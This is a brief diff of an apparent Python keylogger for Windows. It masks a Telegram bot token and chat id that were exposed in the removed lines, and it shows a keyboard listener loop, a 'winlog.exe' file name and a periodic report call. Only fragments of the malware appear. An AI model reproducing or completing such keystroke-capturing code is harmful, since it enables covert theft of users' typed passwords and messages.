@@ -7,8 +7,8 @@ import sys
 import winreg
 import ctypes
 
-bot_token = '7760127959:AAHlNqVl3gy2BnH-Ave5H1cup2lyeVbgUDA'
-chat_id = 'TERA_CHAT_ID'
+bot_token = '##########################'
+chat_id = '############################'
 interval = 60
 filename = "winlog.exe"
 log = ""
@@ -58,3 +58,4 @@ report()
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
+
